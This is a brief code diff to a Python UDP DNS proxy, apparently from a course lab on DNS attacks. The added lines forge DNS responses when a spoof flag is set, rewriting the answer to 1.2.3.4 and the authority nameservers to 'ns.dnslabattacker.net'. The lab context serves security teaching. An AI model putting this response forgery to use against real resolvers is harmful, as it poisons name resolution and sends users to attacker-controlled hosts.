@@ -19,7 +19,7 @@ dns_port = args.dns_port
 SPOOF = args.spoof_response
 
 PROXY_IP = "127.0.0.1"
-server = socket.socket(socket.AF_INET, socket.SOCK_DGRAM )
+server = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 server.bind((PROXY_IP, port))
 
 # Main reroute loop
@@ -31,7 +31,13 @@ while True:
 
     # Response data
 	response_data, (response_addr, response_port) = server.recvfrom(1024)
+	dns_pack = DNS(response_data)
+
+	# Spoof for part 3
+	if SPOOF:
+		dns_pack.an.rdata = "1.2.3.4"
+		dns_pack.ns['DNSRR'][0].rdata = "ns.dnslabattacker.net"
+		dns_pack.ns['DNSRR'][1].rdata = "ns.dnslabattacker.net"
 
 	# Send DNS packet
-	dns_pack = DNS(response_data)
 	server.sendto(bytes(dns_pack), (initial_addr, initial_port))
